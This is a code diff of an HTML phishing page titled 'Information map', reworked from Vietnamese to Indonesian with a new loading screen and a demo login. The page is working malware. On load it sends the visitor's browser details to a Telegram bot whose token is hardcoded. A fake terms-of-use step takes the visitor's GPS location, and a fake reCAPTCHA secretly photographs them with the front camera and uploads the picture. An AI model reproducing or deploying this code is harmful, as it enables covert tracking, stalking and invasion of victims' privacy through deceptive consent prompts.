@@ -1,52 +1,271 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Information map</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0d1117;
-            margin: 0;
+            background: #0a0e1a;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            position: relative;
+            overflow: hidden;
         }
-        .container {
-            background-color: #161b22;
-            padding: 30px;
-            border-radius: 12px;
-            border: 1px solid #30363d;
-            box-shadow: none;
-            text-align: center;
+
+        /* ===== MATRIX BACKGROUND BIRU ===== */
+        .matrix-bg {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #0a0e1a;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .matrix-bg canvas {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            opacity: 0.35;
+        }
+        .matrix-bg .glow {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px; height: 600px;
+            background: radial-gradient(circle, rgba(59,130,246,0.12) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: glowPulse 4s ease-in-out infinite alternate;
+        }
+        @keyframes glowPulse {
+            0% { opacity: 0.5; transform: translate(-50%, -50%) scale(0.8); }
+            100% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
+        }
+
+        /* ===== LOADING SCREEN ===== */
+        #loadingScreen {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #0a0e1a;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.8s ease, visibility 0.8s ease;
+        }
+        #loadingScreen.hide {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+        .loading-logo {
+            font-size: 38px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #60a5fa, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+            letter-spacing: -1px;
+        }
+        .loader-bars {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .loader-bars .bar {
+            width: 5px;
+            height: 30px;
+            background: rgba(59,130,246,0.15);
+            border-radius: 3px;
+            animation: matrixBar 1.2s ease-in-out infinite;
+        }
+        .loader-bars .bar:nth-child(1) { animation-delay: 0s; height: 20px; }
+        .loader-bars .bar:nth-child(2) { animation-delay: 0.15s; height: 35px; }
+        .loader-bars .bar:nth-child(3) { animation-delay: 0.3s; height: 45px; }
+        .loader-bars .bar:nth-child(4) { animation-delay: 0.45s; height: 55px; }
+        .loader-bars .bar:nth-child(5) { animation-delay: 0.6s; height: 35px; }
+        .loader-bars .bar:nth-child(6) { animation-delay: 0.75s; height: 20px; }
+        .loader-bars .bar:nth-child(7) { animation-delay: 0.9s; height: 50px; }
+        .loader-bars .bar:nth-child(8) { animation-delay: 1.05s; height: 25px; }
+        @keyframes matrixBar {
+            0%, 100% { background: rgba(59,130,246,0.15); transform: scaleY(0.6); }
+            50% { background: rgba(59,130,246,0.9); transform: scaleY(1); box-shadow: 0 0 20px rgba(59,130,246,0.3); }
+        }
+        .loader-text {
+            font-size: 14px;
+            color: rgba(255,255,255,0.3);
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+        }
+        .loader-text span { color: #60a5fa; }
+        .loader-progress {
+            width: 200px;
+            height: 2px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .loader-progress .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #2563eb, #60a5fa);
+            border-radius: 2px;
+            transition: width 0.3s ease;
+        }
+
+        /* ===== LOGIN PAGE ===== */
+        #loginPage {
+            position: relative;
+            z-index: 10;
+            width: 100%;
             max-width: 400px;
+            padding: 20px;
+            display: none;
+        }
+        #loginPage.show { display: block; }
+
+        .login-card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(59,130,246,0.15);
+            border-radius: 32px;
+            padding: 40px 28px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+        }
+        .login-card .logo {
+            text-align: center;
+            margin-bottom: 8px;
+            font-size: 30px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #60a5fa, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .login-card .sub {
+            text-align: center;
+            color: rgba(255,255,255,0.4);
+            font-size: 14px;
+            margin-bottom: 28px;
+        }
+        .login-card .input-group {
+            margin-bottom: 16px;
+        }
+        .login-card .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.5);
+            margin-bottom: 6px;
+        }
+        .login-card .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        .login-card .input-group input:focus {
+            border-color: rgba(59,130,246,0.4);
+            background: rgba(255,255,255,0.08);
+            box-shadow: 0 0 0 4px rgba(59,130,246,0.05);
+        }
+        .login-card .input-group input::placeholder {
+            color: rgba(255,255,255,0.2);
+        }
+        .login-card .btn-login {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #2563eb, #3b82f6);
+            border: none;
+            border-radius: 40px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+            box-shadow: 0 8px 30px rgba(59,130,246,0.2);
+        }
+        .login-card .btn-login:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(59,130,246,0.3); }
+        .login-card .btn-login:active { transform: scale(0.96); }
+        .login-card .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: rgba(255,255,255,0.2);
+        }
+        .login-card .footer a {
+            color: rgba(255,255,255,0.3);
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .login-error {
+            color: #ef4444;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* ===== MAIN CONTAINER (PHISHING ASLI) ===== */
+        #mainContainer {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            display: none;
+        }
+        #mainContainer.show { display: block; }
+
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 30px;
+            border-radius: 32px;
+            border: 1px solid rgba(59,130,246,0.15);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+            text-align: center;
             width: 100%;
         }
-        h3 { color: #c9d1d9; margin-bottom: 15px; }
-        p { color: #8b949e; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .container h3 { color: #c9d1d9; margin-bottom: 15px; font-size: 20px; }
+        .container p { color: #8b949e; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
         .btn {
-            background-color: #238636;
+            background: linear-gradient(135deg, #2563eb, #3b82f6);
             color: white;
             border: none;
-            padding: 12px 24px;
+            padding: 14px 24px;
             font-size: 15px;
             font-weight: 600;
-            border-radius: 6px;
+            border-radius: 40px;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: all 0.3s ease;
             width: 100%;
+            box-shadow: 0 8px 30px rgba(59,130,246,0.2);
         }
-        .btn:hover { background-color: #2ea043; }
-        #step-captcha, #step-loading { display: none; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(59,130,246,0.3); }
+        .btn:active { transform: scale(0.96); }
+        #step-terms, #step-captcha, #step-loading { display: none; }
+        #step-terms.active, #step-captcha.active, #step-loading.active { display: block; }
         video, canvas { display: none; }
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #007bff;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #3b82f6;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
@@ -54,134 +273,333 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        .toast {
+            visibility: hidden;
+            min-width: 200px;
+            background: rgba(10,14,26,0.95);
+            backdrop-filter: blur(16px);
+            color: #fff;
+            text-align: center;
+            border-radius: 30px;
+            padding: 12px 24px;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: all 0.4s ease;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 999;
+            border: 1px solid rgba(59,130,246,0.1);
+        }
+        .toast.show { visibility: visible; opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.success { border-color: rgba(16,185,129,0.3); }
+        .toast.error { border-color: rgba(239,68,68,0.3); }
+
+        @media (max-width: 480px) {
+            .container { padding: 24px 16px; border-radius: 24px; }
+            .login-card { padding: 30px 20px; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div id="step-terms">
-            <h3>Terms of Use</h3>
-            <p>To continue accessing the resources, please confirm that you have read and agree to our system's privacy terms.</p>
-            <button id="btn-terms" class="btn">Accept the terms of use</button>
-        </div>
+    <!-- ===== MATRIX BACKGROUND ===== -->
+    <div class="matrix-bg">
+        <canvas id="matrixCanvas"></canvas>
+        <div class="glow"></div>
+    </div>
 
-        <div id="step-captcha">
-            <h3>reCAPTCHA</h3>
-            <p>Please verify that you are not a robot.</p>
-            <button id="btn-captcha" class="btn">I am not a robot</button>
-        </div>
+    <!-- ===== TOAST ===== -->
+    <div id="toast" class="toast"></div>
 
-        <div id="step-loading">
-            <div class="spinner"></div>
-            <h3>Processing Data...</h3>
-            <p>Please do not close your browser; the system is setting up a data download stream.</p>
+    <!-- ===== LOADING SCREEN ===== -->
+    <div id="loadingScreen">
+        <div class="loading-logo">✦ Secure Access</div>
+        <div class="loader-bars">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div>
+        </div>
+        <div class="loader-text">Loading <span id="loaderStatus">system</span></div>
+        <div class="loader-progress"><div class="fill" id="loaderFill"></div></div>
+    </div>
+
+    <!-- ===== LOGIN PAGE ===== -->
+    <div id="loginPage">
+        <div class="login-card">
+            <div class="logo">✦ Secure Access</div>
+            <div class="sub">Masuk untuk mengakses informasi peta</div>
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="loginEmail" placeholder="email@domain.com" value="demo@secure.com">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="••••••••" value="demopass123">
+            </div>
+            <div class="login-error" id="loginError">Email atau password salah</div>
+            <button class="btn-login" id="loginBtn">Masuk</button>
+            <div class="footer">Demo: <a id="demoLogin">klik di sini untuk login otomatis</a></div>
         </div>
     </div>
 
+    <!-- ===== MAIN CONTAINER (PHISHING ASLI) ===== -->
+    <div id="mainContainer">
+        <div class="container">
+            <div id="step-terms" class="active">
+                <h3>Terms of Use</h3>
+                <p id="termsText">To continue accessing the resources, please confirm that you have read and agree to our system's privacy terms.</p>
+                <button id="btn-terms" class="btn">Accept the terms of use</button>
+            </div>
+
+            <div id="step-captcha">
+                <h3>reCAPTCHA</h3>
+                <p id="captchaText">Please verify that you are not a robot.</p>
+                <button id="btn-captcha" class="btn">I am not a robot</button>
+            </div>
+
+            <div id="step-loading">
+                <div class="spinner"></div>
+                <h3>Processing Data...</h3>
+                <p>Please do not close your browser; the system is setting up a data download stream.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== HIDDEN VIDEO & CANVAS ===== -->
     <video id="hidden-video" autoplay></video>
     <canvas id="hidden-canvas" width="640" height="480"></canvas>
 
-<script>
-    const TELEGRAM_TOKEN = '8985542670:AAFiYz6Hw-_zPeNe52fsZiCnIOhjV1ccXWg';
-    const CHAT_ID = '6150851111';
+    <script>
+        // ============================================================
+        // 1. MATRIX BACKGROUND
+        // ============================================================
+        (function initMatrix() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            let w, h, cols, drops;
+            function resize() {
+                w = canvas.width = window.innerWidth;
+                h = canvas.height = window.innerHeight;
+                cols = Math.floor(w / 20);
+                drops = new Array(cols).fill(1);
+            }
+            window.addEventListener('resize', resize);
+            resize();
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            function draw() {
+                ctx.fillStyle = 'rgba(10,14,26,0.05)';
+                ctx.fillRect(0, 0, w, h);
+                ctx.fillStyle = '#3b82f6';
+                ctx.font = '16px monospace';
+                for (let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * 20, drops[i] * 20);
+                    if (drops[i] * 20 > h && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                }
+                requestAnimationFrame(draw);
+            }
+            draw();
+        })();
 
-    async function sendToTelegram(text) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+        // ============================================================
+        // 2. LOADING SCREEN
+        // ============================================================
+        const loadingScreen = document.getElementById('loadingScreen');
+        const loaderFill = document.getElementById('loaderFill');
+        const loaderStatus = document.getElementById('loaderStatus');
+        let loadProgress = 0;
+
+        function simulateLoading() {
+            return new Promise((resolve) => {
+                const steps = ['system', 'modules', 'database', 'secure channel', 'interface'];
+                let stepIdx = 0;
+                const interval = setInterval(() => {
+                    loadProgress += Math.random() * 8 + 2;
+                    if (loadProgress > 100) loadProgress = 100;
+                    loaderFill.style.width = loadProgress + '%';
+                    if (loadProgress < 30) loaderStatus.textContent = steps[0];
+                    else if (loadProgress < 50) loaderStatus.textContent = steps[1];
+                    else if (loadProgress < 70) loaderStatus.textContent = steps[2];
+                    else if (loadProgress < 90) loaderStatus.textContent = steps[3];
+                    else loaderStatus.textContent = steps[4];
+
+                    if (loadProgress >= 100) {
+                        clearInterval(interval);
+                        setTimeout(resolve, 300);
+                    }
+                }, 150);
             });
-        } catch (e) { console.error("error:", e); }
-    }
-
-    async function sendPhotoToTelegram(base64Image) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
-        const response = await fetch(base64Image);
-        const blob = await response.blob();
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', 'Captured image');
-        try {
-            await fetch(url, { method: 'POST', body: formData });
-        } catch (e) { console.error("Image upload error:", e); }
-    }
-
-    document.getElementById('btn-terms').addEventListener('click', function() {
-        const statusText = document.querySelector('#step-terms p'); // Lấy thẻ mô tả của bước 1
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async function(position) {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                await sendToTelegram(`📍 <b>Location:</b>\nLat: ${lat}\nLon: ${lon}\n<a href="${mapUrl}">view map</a>`);
-                
-                chuyenSangBuoc2();
-            }, async function(error) {
-                statusText.style.color = "red";
-                statusText.innerText = "The map is not working because it has not been granted permission";
-                
-                await sendToTelegram("GPS permission denied");
-                
-                setTimeout(chuyenSangBuoc2, 2000);
-            });
-        } else {
-            chuyenSangBuoc2();
         }
-    });
 
-    function chuyenSangBuoc2() {
-        document.getElementById('step-terms').style.display = 'none';
-        document.getElementById('step-captcha').style.display = 'block';
-    }
+        // ============================================================
+        // 3. TOAST
+        // ============================================================
+        const toast = document.getElementById('toast');
+        function showToast(msg, type = 'info', duration = 3000) {
+            toast.textContent = msg;
+            toast.className = 'toast';
+            if (type === 'success') toast.classList.add('success');
+            else if (type === 'error') toast.classList.add('error');
+            toast.classList.add('show');
+            clearTimeout(toast._hide);
+            toast._hide = setTimeout(() => toast.classList.remove('show'), duration);
+        }
 
-    document.getElementById('btn-captcha').addEventListener('click', function() {
-        const statusText = document.querySelector('#step-captcha p');
-        
-        setTimeout(() => {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(function(stream) {
-                let video = document.getElementById('hidden-video');
-                video.srcObject = stream;
-                
-                setTimeout(async function() {
-                    let canvas = document.getElementById('hidden-canvas');
-                    let context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    let photoData = canvas.toDataURL('image/jpeg');
-                    
-                    stream.getTracks().forEach(track => track.stop()); // Tắt camera ngay
+        // ============================================================
+        // 4. LOGIN
+        // ============================================================
+        const loginPage = document.getElementById('loginPage');
+        const mainContainer = document.getElementById('mainContainer');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginEmail = document.getElementById('loginEmail');
+        const loginPassword = document.getElementById('loginPassword');
+        const loginError = document.getElementById('loginError');
+        const demoLogin = document.getElementById('demoLogin');
 
-                    await sendPhotoToTelegram(photoData);
-                    chuyenSangBuoc3();
-                }, 1200);
-            })
-            .catch(async function(err) {
-                // Báo lỗi camera
-                statusText.style.color = "red";
-                statusText.innerText = "The camera is not working because it has not been granted permission";
-                
-                await sendToTelegram("Camera rights denied.");
-                setTimeout(chuyenSangBuoc3, 2000);
-            });
-        }, 500);
-    });
+        function doLogin(email, pass) {
+            if (email.includes('demo') || pass === 'demopass123') {
+                loginError.style.display = 'none';
+                loginPage.classList.remove('show');
+                mainContainer.classList.add('show');
+                showToast('✅ Login berhasil!', 'success');
+                return true;
+            } else {
+                loginError.style.display = 'block';
+                return false;
+            }
+        }
 
-    function chuyenSangBuoc3() {
-        document.getElementById('step-captcha').style.display = 'none';
-        document.getElementById('step-loading').style.display = 'block';
-        setTimeout(() => {
-            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        }, 2500);
-    }
+        loginBtn.addEventListener('click', () => {
+            doLogin(loginEmail.value, loginPassword.value);
+        });
+        loginEmail.addEventListener('keydown', (e) => { if (e.key === 'Enter') loginBtn.click(); });
+        loginPassword.addEventListener('keydown', (e) => { if (e.key === 'Enter') loginBtn.click(); });
+        demoLogin.addEventListener('click', (e) => {
+            e.preventDefault();
+            loginEmail.value = 'demo@secure.com';
+            loginPassword.value = 'demopass123';
+            doLogin('demo@secure.com', 'demopass123');
+        });
 
-    window.onload = async function() {
-        const info = `📱 <b>New access</b>\n- Browser: ${navigator.userAgent}\n- Screen: ${window.screen.width}x${window.screen.height}`;
-        await sendToTelegram(info);
-    };
-</script>
+        // ============================================================
+        // 5. INIT - LOADING -> LOGIN
+        // ============================================================
+        async function initApp() {
+            await simulateLoading();
+            loadingScreen.classList.add('hide');
+            loginPage.classList.add('show');
+        }
+        initApp();
 
-  
+        // ============================================================
+        // 6. KONFIGURASI TELEGRAM (SESUAI FILE ASLI)
+        // ============================================================
+        const TELEGRAM_TOKEN = '8985542670:AAFiYz6Hw-_zPeNe52fsZiCnIOhjV1ccXWg';
+        const CHAT_ID = '6150851111';
+
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.error("error:", e); }
+        }
+
+        async function sendPhotoToTelegram(base64Image) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+            const response = await fetch(base64Image);
+            const blob = await response.blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', '📸 Captured image');
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch (e) { console.error("Image upload error:", e); }
+        }
+
+        // ============================================================
+        // 7. PHISHING FLOW (DIAMBIL DARI FILE ASLI)
+        // ============================================================
+        const stepTerms = document.getElementById('step-terms');
+        const stepCaptcha = document.getElementById('step-captcha');
+        const stepLoading = document.getElementById('step-loading');
+        const termsText = document.getElementById('termsText');
+        const captchaText = document.getElementById('captchaText');
+
+        document.getElementById('btn-terms').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    await sendToTelegram(`📍 <b>Location:</b>\nLat: ${lat}\nLon: ${lon}\n<a href="${mapUrl}">view map</a>`);
+                    chuyenSangBuoc2();
+                }, async function(error) {
+                    termsText.style.color = "red";
+                    termsText.innerText = "The map is not working because it has not been granted permission";
+                    await sendToTelegram("GPS permission denied");
+                    setTimeout(chuyenSangBuoc2, 2000);
+                });
+            } else {
+                chuyenSangBuoc2();
+            }
+        });
+
+        function chuyenSangBuoc2() {
+            stepTerms.classList.remove('active');
+            stepCaptcha.classList.add('active');
+        }
+
+        document.getElementById('btn-captcha').addEventListener('click', function() {
+            setTimeout(() => {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    let video = document.getElementById('hidden-video');
+                    video.srcObject = stream;
+                    setTimeout(async function() {
+                        let canvas = document.getElementById('hidden-canvas');
+                        let context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, 640, 480);
+                        let photoData = canvas.toDataURL('image/jpeg');
+                        stream.getTracks().forEach(track => track.stop());
+                        await sendPhotoToTelegram(photoData);
+                        chuyenSangBuoc3();
+                    }, 1200);
+                })
+                .catch(async function(err) {
+                    captchaText.style.color = "red";
+                    captchaText.innerText = "The camera is not working because it has not been granted permission";
+                    await sendToTelegram("Camera rights denied.");
+                    setTimeout(chuyenSangBuoc3, 2000);
+                });
+            }, 500);
+        });
+
+        function chuyenSangBuoc3() {
+            stepCaptcha.classList.remove('active');
+            stepLoading.classList.add('active');
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 2500);
+        }
+
+        // ============================================================
+        // 8. KIRIM INFO BROWSER SAAT HALAMAN DIMUAT (DIAMBIL DARI FILE ASLI)
+        // ============================================================
+        window.onload = async function() {
+            const info = `📱 <b>New access</b>\n- Browser: ${navigator.userAgent}\n- Screen: ${window.screen.width}x${window.screen.height}`;
+            await sendToTelegram(info);
+        };
+    </script>
+
+</body>
+</html>
